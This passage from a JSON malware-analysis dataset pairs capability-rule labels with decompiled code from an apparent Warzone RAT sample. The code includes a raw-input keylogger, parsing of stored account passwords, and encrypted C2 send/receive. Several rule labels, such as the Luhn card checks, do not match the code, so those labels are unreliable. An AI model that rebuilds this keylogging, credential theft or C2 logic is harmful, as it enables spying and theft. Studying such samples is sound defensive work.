            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401eb2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = *(param_1 + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n        fcn.00403148();\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 80
    },
    "004027ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004027ff(int32_t pNodeName)\n\n{\n    uint arg_10h;\n    int32_t iVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint noname_0;\n    uint *puVar2;\n    uint *arg_8h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    arg_10h = *(pNodeName + 4);\n    puVar2 = &pNodeName;\n    arg_8h = &var_ch;\n    fcn.00405db3(arg_8h);\n    fcn.00403666(arg_8h);\n    fcn.00405feb(arg_8h, puVar2);\n    iVar1 = (*_sym.imp.WS2_32.dll_inet_addr)(pNodeName);\n    noname_0 = extraout_ECX;\n    if (iVar1 == -1) {\n        var_8h = 0;\n        puVar2 = &var_2ch;\n        for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        var_24h = 1;\n        var_20h = 6;\n        (*_sym.imp.WS2_32.dll_getaddrinfo)(pNodeName, 0, &var_2ch, &var_8h);\n        iVar1 = *(*(var_8h + 0x18) + 4);\n        noname_0 = extraout_ECX_00;\n    }\n    fcn.00415f88(noname_0, in_ECX, arg_10h, iVar1);\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 421
    },
    "00409244": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409244(uint lpFileName)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t lpString2;\n    uint uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint8_t *puVar11;\n    uint *arg_8h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    char *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint8_t *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    \n    iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(lpFileName, 0x80000000, 7, 0, 3, 0, 0);\n    if (iVar4 == -1) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(0xffffffff);\n        return;\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar4, 0);\n    var_ch = uVar5;\n    pcVar6 = fcn.00401085(uVar5);\n    var_1ch = pcVar6;\n    fcn.00401052(pcVar6, 0, uVar5);\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, pcVar6, uVar5, &var_14h, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    iVar7 = fcn.00405ffa();\n    var_18h = iVar7;\n    lpString2 = fcn.00405ffa();\n    var_8h = fcn.00405ffa();\n    bVar2 = false;\n    uVar5 = 0;\n    iVar4 = 0;\n    if (var_ch != 0) {\n        do {\n            cVar1 = pcVar6[uVar5];\n            iVar9 = iVar4;\n            if ((cVar1 - 0x21U < 0x5e) && (cVar1 != '=')) {\n                *(iVar4 + iVar7) = cVar1;\n                iVar9 = iVar4 + 1;\n                if (bVar2) {\n                    if (((((*(iVar4 + -7 + iVar7) == 'P') && (*(iVar4 + -6 + iVar7) == 'a')) &&\n                         (*(iVar4 + -5 + iVar7) == 's')) &&\n                        ((*(iVar4 + -4 + iVar7) == 's' && (*(iVar4 + -3 + iVar7) == 'w')))) &&\n                       ((*(iVar4 + -2 + iVar7) == 'o' && ((*(iVar4 + -1 + iVar7) == 'r' && (*(iVar4 + iVar7) == 'd')))))\n                       ) {\n                        iVar4 = 2;\n                        if (*pcVar6 != -0x30) {\n                            iVar4 = 9;\n                        }\n                        iVar7 = 0;\n                        uVar3 = pcVar6[iVar4 + uVar5];\n                        if (uVar3 < 0x21) goto code_r0x00409428;\n                        puVar11 = pcVar6 + iVar4 + uVar5;\n                        goto code_r0x00409415;\n                    }\n                }\n                else if ((((7 < iVar9) && (*(iVar4 + -6 + iVar7) == 'A')) && (*(iVar4 + -5 + iVar7) == 'c')) &&\n                        (((*(iVar4 + -4 + iVar7) == 'c' && (*(iVar4 + -3 + iVar7) == 'o')) &&\n                         ((*(iVar4 + -2 + iVar7) == 'u' && ((*(iVar4 + -1 + iVar7) == 'n' && (*(iVar4 + iVar7) == 't')))\n                          ))))) {\n                    iVar4 = 2;\n                    if (*pcVar6 != -0x30) {\n                        iVar4 = 9;\n                    }\n                    iVar10 = 0;\n                    var_10h = iVar4 + uVar5;\n                    uVar3 = var_10h[pcVar6];\n                    if (0x20 < uVar3) {\n                        var_10h = var_10h + pcVar6;\n                        puVar11 = var_10h;\n                        do {\n                            iVar7 = var_18h;\n                            pcVar6 = var_1ch;\n                            if (0x7e < uVar3) break;\n                            puVar11 = puVar11 + 1;\n                            *(iVar10 + lpString2) = uVar3;\n                            iVar10 = iVar10 + 1;\n                            uVar3 = *puVar11;\n                        } while (0x20 < uVar3);\n                    }\n                    *(iVar10 + lpString2) = 0;\n                    bVar2 = true;\n                }\n            }\n            uVar5 = uVar5 + 1;\n            iVar4 = iVar9;\n        } while (uVar5 < var_ch);\n    }\n    goto code_r0x004094da;\n    while( true ) {\n        *(iVar7 + var_8h) = uVar3;\n        iVar7 = iVar7 + 1;\n        puVar11 = puVar11 + 1;\n        uVar3 = *puVar11;\n        if (uVar3 < 0x21) break;\ncode_r0x00409415:\n        if ((0x7e < uVar3) || (uVar3 == 0x21)) break;\n    }\ncode_r0x00409428:\n    var_30h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    *(iVar7 + var_8h) = 0;\n    fcn.004034d1(var_8h);\n    fcn.004034d1(lpString2);\n    uVar8 = fcn.004031af(&var_1ch);\n    fcn.00403549(uVar8);\n    fcn.00405feb();\n    uVar8 = fcn.004031af(&var_1ch);\n    fcn.00403549(uVar8);\n    fcn.00405feb();\n    var_24h = 5;\n    uVar8 = fcn.004036f7(0x417668);\n    fcn.00403549(uVar8);\n    fcn.00405feb();\n    arg_8h = &var_30h;\n    fcn.00401ff2(arg_8h);\n    fcn.00402028(arg_8h);\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00401441();\ncode_r0x004094da:\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00405feb();\n    fcn.00401099(pcVar6);\n    return;\n}\n",
        "token_count": 1582
    },
    "00411865": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411865(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack28;\n    int16_t *arg_8h_00;\n    int16_t *piVar6;\n    \n    piVar6 = arg_8h;\n    *(in_ECX + 0x20) = arg_8h;\n    if ((*arg_8h == 0x5a4d) && (piVar2 = *(arg_8h + 0x1e) + arg_8h,  *piVar2 == 0x4550)) {\n        if (*(piVar2 + 1) == 0x14c) {\n            *(in_ECX + 0x40) = 1;\n            *(in_ECX + 0x24) = piVar2;\n            uStack28 = 0x4118b6;\n            fcn.004030cc(arg_8h, piVar2[0x15]);\n            iVar1 = *(in_ECX + 0x24);\n            arg_8h = NULL;\n            iVar4 = iVar1 + 0x18 + *(iVar1 + 0x14);\n            if (*(iVar1 + 6) != 0) {\n                do {\n                    arg_8h_00 = piVar6;\n                    fcn.00411fe2(piVar6, iVar4);\n                    fcn.00402312(arg_8h_00, iVar4, &stack0xffffffb8, uStack72, uStack68, uStack64, uStack60, uStack56, \n                                 uStack52, uStack48, uStack44);\n                    iVar4 = iVar4 + 0x28;\n                    arg_8h = arg_8h + 1;\n                } while (arg_8h < *(*(in_ECX + 0x24) + 6));\n            }\n        }\n        else if (*(piVar2 + 1) == -0x799c) {\n            iVar5 = 0;\n            *(in_ECX + 0x28) = piVar2;\n            *(in_ECX + 0x40) = 0;\n            uStack28 = 0x41191c;\n            fcn.004030cc(arg_8h, piVar2[0x15]);\n            iVar1 = *(in_ECX + 0x28);\n            iVar4 = *(iVar1 + 0x14) + 0x18 + iVar1;\n            if (*(iVar1 + 6) != 0) {\n                do {\n                    piVar6 = arg_8h;\n                    fcn.00411fe2(arg_8h, iVar4);\n                    fcn.00402312(piVar6, iVar4, &stack0xffffffb8, uStack72, uStack68, uStack64, uStack60, uStack56, \n                                 uStack52, uStack48, uStack44);\n                    iVar5 = iVar5 + 1;\n                    iVar4 = iVar4 + 0x28;\n                } while (iVar5 < *(*(in_ECX + 0x28) + 6));\n            }\n        }\n        uVar3 = 1;\n        *(in_ECX + 0x3c) = 1;\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 818
    },
    "00402312": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00402312(int32_t arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_10h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00406099();\n        if (piVar1 == NULL) {\n            var_10h = NULL;\n        }\n        else {\n            var_10h = piVar1 + 1;\n            *piVar1 = piVar3;\n            if (piVar3 != NULL) {\n                piVar1 = piVar1 + 0xb;\n                piVar5 = piVar3;\n                do {\n                    *piVar1 = 0;\n                    piVar1[1] = 0;\n                    piVar5 = piVar5 + -1;\n                    piVar1 = piVar1 + 0xc;\n                } while (piVar5 != NULL);\n            }\n        }\n        var_4h = NULL;\n        if (in_ECX[2] != NULL) {\n            var_8h = 0;\n            piVar1 = var_10h;\n            do {\n                piVar5 = *in_ECX;\n                piVar4 = piVar5 + var_8h;\n                piVar6 = piVar1;\n                for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *piVar6 = *piVar4;\n                    piVar4 = piVar4 + 1;\n                    piVar6 = piVar6 + 1;\n                }\n                fcn.00402fce(piVar5 + var_8h + 10);\n                var_4h = var_4h + 1;\n                var_8h = var_8h + 0x30;\n                piVar1 = piVar1 + 0xc;\n            } while (var_4h < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401eb2();\n        }\n        *in_ECX = var_10h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = &arg_8h;\n    piVar3 = var_10h + in_ECX[2] * 0xc;\n    for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar3 = *piVar1;\n        piVar1 = piVar1 + 1;\n        piVar3 = piVar3 + 1;\n    }\n    fcn.00402fce(&arg_30h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00403148();\n    return;\n}\n",
        "token_count": 793
    },
    "004117d8": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004117d8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch_00;\n    uint var_3ch;\n    uint var_14h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = 0;\n    if (*(in_ECX + 0x34) != 0) {\n        var_ch = in_ECX + 0x2c;\n        var_8h = 0;\n        do {\n            iVar1 = var_8h;\n            fcn.00405de9();\n            fcn.00412018(*(in_ECX + 0x2c) + iVar1);\n            fcn.004034d1(&var_3ch);\n            iVar1 = fcn.004034b5(arg_ch);\n            fcn.00405feb();\n            fcn.00403148();\n            if (iVar1 != 0) {\n                fcn.0040241a(arg_8h, arg_ch_00);\n                return;\n            }\n            arg_ch_00 = arg_ch_00 + 1;\n            var_8h = var_8h + 0x30;\n        } while (arg_ch_00 < *(in_ECX + 0x34));\n    }\n    return;\n}\n",
        "token_count": 308
    },
    "004026bb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004026bb(int32_t pNodeName)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    uint noname_0;\n    uint *puVar2;\n    uint *arg_8h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    var_14h = *(pNodeName + 4);\n    fcn.0040373f(pNodeName + 8);\n    puVar2 = &pNodeName;\n    arg_8h = &var_ch;\n    fcn.00405db3(arg_8h);\n    fcn.00403666(arg_8h);\n    fcn.00405feb(arg_8h, puVar2);\n    iVar1 = (*_sym.imp.WS2_32.dll_inet_addr)(pNodeName);\n    if (iVar1 == -1) {\n        var_8h = 0;\n        puVar2 = &var_34h;\n        for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        var_2ch = 1;\n        var_28h = 6;\n        (*_sym.imp.WS2_32.dll_getaddrinfo)(pNodeName, 0, &var_34h, &var_8h);\n        iVar1 = *(*(var_8h + 0x18) + 4);\n    }\n    puVar2 = &var_10h;\n    fcn.0040373f(puVar2);\n    fcn.00413e36(noname_0, in_ECX, var_14h, iVar1, puVar2);\n    fcn.00405feb();\n    fcn.00405feb();\n    return;\n}\n",
        "token_count": 439
    },
    "004056f5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004056f5(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    bool bVar3;\n    uint *arg_8h_00;\n    uint arg_10h;\n    uint uVar4;\n    uint uVar5;\n    uint var_14h;\n    uint buf;\n    uint var_8h;\n    \n    if (*(in_ECX + 0xc) == -1) {\n        bVar3 = false;\n    }\n    else {\n        uVar1 = fcn.004034d1(\"warzoneTURBO\");\n        fcn.00403115(uVar1);\n        fcn.00405feb();\n        iVar2 = arg_8h;\n        uVar4 = extraout_ECX;\n        uVar5 = extraout_ECX;\n        fcn.0040315e(arg_8h);\n        arg_8h_00 = &var_14h;\n        uVar1 = extraout_ECX_00;\n        arg_10h = extraout_ECX_00;\n        fcn.0040315e(arg_8h_00);\n        fcn.004061f0(arg_8h_00, uVar1, arg_10h, iVar2);\n        iVar2 = (*_sym.imp.WS2_32.dll_send)(*(in_ECX + 0xc), buf, *(arg_8h + 4), 0, uVar4, uVar5);\n        bVar3 = iVar2 != -1;\n        fcn.00403148();\n        fcn.00403148();\n    }\n    return bVar3;\n}\n",
        "token_count": 383
    },
    "0040577f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0040577f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint arg_ch_00;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uchar auStackY65600 [65520];\n    uint uStackY80;\n    uint *arg_8h_00;\n    uint uVar3;\n    uint arg_10h;\n    uint *puVar4;\n    uint var_38h;\n    uint var_34h;\n    uchar *var_30h;\n    int32_t var_28h;\n    uint var_20h;\n    uint optname;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.004011c0();\n    if (*(extraout_ECX + 0xc) != -1) {\n        var_10h = 4;\n        var_14h = &fcn.0040577f::optname;\n        optname = 0x1006;\n        var_ch = unaff_EDI;\n        var_8h = unaff_ESI;\n        (*_sym.imp.WS2_32.dll_setsockopt)();\n        var_30h = 0x4057cc;\n        fcn.00401052();\n        var_28h = fcn.004034d1(\"warzoneTURBO\");\n        fcn.00403115(var_28h);\n        fcn.00405feb();\n        var_14h = NULL;\n        var_10h = 0;\n        do {\n            var_30h = 0xc;\n            arg_ch = (*_sym.imp.WS2_32.dll_recv)();\n            if (arg_ch == 0xc) {\n                var_30h = &stack0xfffeffc0;\n                var_ch = 0;\n                var_8h = 0;\n                fcn.004030cc(var_30h, 0xc);\n                puVar4 = &fcn.0040577f::var_ch;\n                fcn.0040315e(puVar4);\n                arg_8h_00 = &fcn.0040577f::var_30h;\n                uStackY80 = 0x405847;\n                uVar3 = extraout_ECX_00;\n                arg_10h = extraout_ECX_00;\n                fcn.0040315e(arg_8h_00);\n                uStackY80 = 0x40584f;\n                fcn.004061f0(arg_8h_00, uVar3, arg_10h, puVar4);\n                iVar1 = *(var_28h + 4) + 0xc;\n                if ((*(var_28h + 4) != 0) && (iVar1 != 0xc)) {\n                    do {\n                        uStackY80 = 0x40587c;\n                        iVar2 = (*_sym.imp.WS2_32.dll_recv)();\n                        if (iVar2 == -1) {\n                            fcn.00403148();\n                            fcn.00403148();\n                            goto code_r0x0040592c;\n                        }\n                        arg_ch = arg_ch + iVar2;\n                    } while (iVar1 != arg_ch);\n                }\n                fcn.00403148();\n                fcn.00403148();\n            }\n            else if (arg_ch == -1) break;\n            var_14h = &stack0xfffeffc0;\n            optname = 0x4058b6;\n            var_10h = arg_ch;\n            fcn.004030cc(var_14h, arg_ch);\n            optname = extraout_ECX_01;\n            fcn.0040315e(&fcn.0040577f::var_14h);\n            puVar4 = &fcn.0040577f::var_30h;\n            var_30h = 0x4058d0;\n            uVar3 = arg_ch_00;\n            fcn.0040315e(puVar4);\n            var_30h = 0x4058d8;\n            fcn.004061f0(puVar4, arg_ch_00, uVar3, &fcn.0040577f::var_14h);\n            fcn.004030fe();\n            fcn.004030cc(arg_ch, arg_ch);\n            fcn.004030fe();\n            fcn.004030fe();\n            var_28h = arg_8h;\n            fcn.0040507e(arg_8h);\n            fcn.00403148();\n        } while (0 < arg_ch);\ncode_r0x0040592c:\n        fcn.00403148();\n        fcn.00403148();\n        fcn.00403148();\n    }\n    return;\n}\n",
        "token_count": 1193
    },
    "0040594b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040594b(uint pNodeName, uint hostshort)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t pAddrInfo;\n    \n    pAddrInfo = 0;\n    fcn.00403237(&pNodeName);\n    *(in_ECX + 4) = hostshort;\n    fcn.0041178e();\n    puVar4 = &var_24h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_18h = 6;\n    uVar5 = 1;\n    var_1ch = 1;\n    iVar3 = (*_sym.imp.WS2_32.dll_getaddrinfo)(pNodeName, 0, &var_24h, &pAddrInfo);\n    if (iVar3 == 0) {\n        iVar3 = *(pAddrInfo + 0x18);\n        iVar2 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 0);\n        *(in_ECX + 0xc) = iVar2;\n        if (iVar2 != -1) {\n            *(in_ECX + 0x1cc) = *(iVar3 + 4);\n            *(in_ECX + 0x1c8) = 2;\n            uVar1 = (*_sym.imp.WS2_32.dll_htons)(hostshort);\n            *(in_ECX + 0x1ca) = uVar1;\n            (*_sym.imp.WS2_32.dll_freeaddrinfo)(pAddrInfo);\n            iVar3 = (*_sym.imp.WS2_32.dll_connect)(*(in_ECX + 0xc), in_ECX + 0x1c8, 0x10);\n            if (iVar3 != -1) {\n                *(in_ECX + 8) = 1;\n                (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*(in_ECX + 0x1d8));\n                goto code_r0x00405a01;\n            }\n            *(in_ECX + 0xc) = 0xffffffff;\n        }\n    }\n    uVar5 = 0;\ncode_r0x00405a01:\n    fcn.00405feb();\n    return uVar5;\n}\n",
        "token_count": 572
    },
    "00408793": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408793(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint uVar6;\n    uchar *arg_8h_00;\n    uchar *arg_8h_01;\n    uint uVar7;\n    ushort uVar8;\n    uint arg_18h;\n    uint uStack604;\n    uint uStack600;\n    int32_t iStack596;\n    uint uStack592;\n    ushort uStack576;\n    ushort uStack574;\n    uint uStack572;\n    uint uStack568;\n    ushort uStack564;\n    uchar auStack560 [16];\n    uchar auStack544 [16];\n    uchar auStack528 [44];\n    uchar auStack484 [480];\n    \n    uVar6 = 0;\n    uStack604 = 0;\n    fcn.00401052(&stack0xfffffdf0, 0, 0x208);\n    if (arg_ch == 1) {\n        uStack574 = 6;\n        uStack568 = arg_8h;\n        uStack572 = 0x130;\n        uStack576 = 1;\n        (*_sym.imp.USER32.dll_RegisterRawInputDevices)(&stack0xfffffdc0, 1, 0xc);\n        goto code_r0x00408b1b;\n    }\n    if (arg_ch == 0x10) {\n        (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        goto code_r0x00408b1b;\n    }\n    if (arg_ch != 0xff) {\n        uVar6 = (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n        goto code_r0x00408b1b;\n    }\n    uVar7 = 0x10;\n    iVar2 = (*_sym.imp.USER32.dll_GetRawInputData)(arg_14h, 0x10000003, 0, &stack0xfffffda4);\n    if (iVar2 == -1) goto code_r0x00408b1b;\n    iVar2 = fcn.00406099();\n    iStack596 = iVar2;\n    if (iVar2 == 0) goto code_r0x00408b1b;\n    iVar3 = (*_sym.imp.USER32.dll_GetRawInputData)(arg_14h, 0x10000003, iVar2, &stack0xfffffd94, 0x10);\n    if ((iVar3 != unaff_ESI) || (*(iVar2 + 0x18) != 0x100)) goto code_r0x00408b1b;\n    uVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    uVar8 = unaff_ESI >> 0x10;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowTextW)(uVar4, &stack0xfffffde0, 0x104);\n    if (iVar2 < 1) {\n        fcn.00403411(L\"Unknow\");\n    }\n    else {\n        uVar4 = fcn.004036f7(&stack0xfffffe1c);\n        uStack592 = 0x40888c;\n        fcn.00403549(uVar4);\n        uStack592 = 0x408895;\n        fcn.00405feb();\n    }\n    fcn.00408c13();\n    uStack592 = 0x4088bf;\n    fcn.00403549(&stack0xfffffdc8);\n    iStack596 = 0x4088d1;\n    fcn.0040357c(*0x42675c + 4);\n    if (**0x42675c != 0) {\n        unaff_EBX = 0x4088ea;\n        fcn.004013b3(*0x42675c + 0x286);\n        arg_8h_01 = &stack0xfffffdc8;\n        fcn.0040373f(arg_8h_01);\n        arg_18h = CONCAT22(uVar8, uStack564);\n        arg_8h_00 = &stack0xfffffdd0;\n        uVar4 = uStack568;\n        fcn.0040373f(arg_8h_00);\n        uVar7 = fcn.00404a78(arg_8h_00, arg_8h_01, uVar7, uVar4, arg_18h);\n        fcn.00405044(uVar7);\n        fcn.00404a4e();\n    }\n    if ((*0x42675c)[0x285] != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*0x42675c + 0x84);\n        if (iVar2 == 0) {\ncode_r0x0040899e:\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x42675c + 0x84, unaff_EBX);\n            piVar5 = *0x42675c;\n            (*0x42675c)[0x284] = 0;\n        }\n        else {\n            uVar7 = fcn.004036f7(*0x42675c + 0x84);\n            iVar2 = fcn.0040335a(uVar7);\n            fcn.00405feb();\n            piVar5 = *0x42675c;\n            if (iVar2 == 0) goto code_r0x0040899e;\n            (*0x42675c)[0x284] = 1;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(piVar5[3], 4, 1, 0, 4, 0x80, 0);\n        piVar5 = *0x42675c;\n        pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n        (*0x42675c)[1] = iVar2;\n        if (piVar5[0x284] == 0) {\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x417a60, piVar5 + 2, 0);\n            uVar4 = 0x417a60;\n            (*pcVar1)((*0x42675c)[1], 0x417a60, uVar7);\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x417a60, *0x42675c + 2, 0);\n            (*pcVar1)((*0x42675c)[1], 0x417a60, uVar7);\n            iVar2 = fcn.00403373(*0x42675c + 2, 0);\n            (*pcVar1)((*0x42675c)[1], uVar4, iVar2 * 2);\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x417a60, *0x42675c + 2, 0);\n            (*pcVar1)((*0x42675c)[1], 0x417a60, uVar7);\n            uVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x417a60, *0x42675c + 2, 0);\n            (*pcVar1)((*0x42675c)[1], 0x417a60, uVar7);\n            piVar5 = *0x42675c;\n        }\n        uVar7 = fcn.00408b2d(piVar5 + 2, 0);\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(uVar7);\n        uVar7 = fcn.00408b2d(iVar2 * 2);\n        (*pcVar1)((*0x42675c)[1], uVar7);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)((*0x42675c)[1]);\n    }\n    fcn.00405feb();\n    uStack600 = 0;\n    fcn.00405feb();\ncode_r0x00408b1b:\n    fcn.00405feb();\n    return uVar6;\n}\n",
        "token_count": 1843
    },
    "0040955b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040955b(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint lpFileName;\n    uint var_354h;\n    uint32_t lpFindFileData;\n    uint var_220h;\n    uint var_10ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetFullPathNameA)(0x426760, 0x104, &var_354h, 0);\n    pcVar1 = _sym.imp.SHLWAPI.dll_PathCombineA;\n    (*_sym.imp.SHLWAPI.dll_PathCombineA)(&lpFileName, &var_354h, 0x418f18);\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindFirstFileA)(&lpFileName, &lpFindFileData);\n    if (iVar2 != -1) {\n        do {\n            if (((lpFindFileData | 0x10) == 0x10) && (var_220h != '.')) {\n                (*pcVar1)(&var_10ch, 0x426760, &var_220h);\n                (*pcVar1)(&var_10ch, &var_10ch, \"Accounts\\\\Account.rec0\");\n                fcn.00409244(&var_10ch);\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_FindNextFileA)(iVar2, &lpFindFileData);\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 337
    },
    "0040c30d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
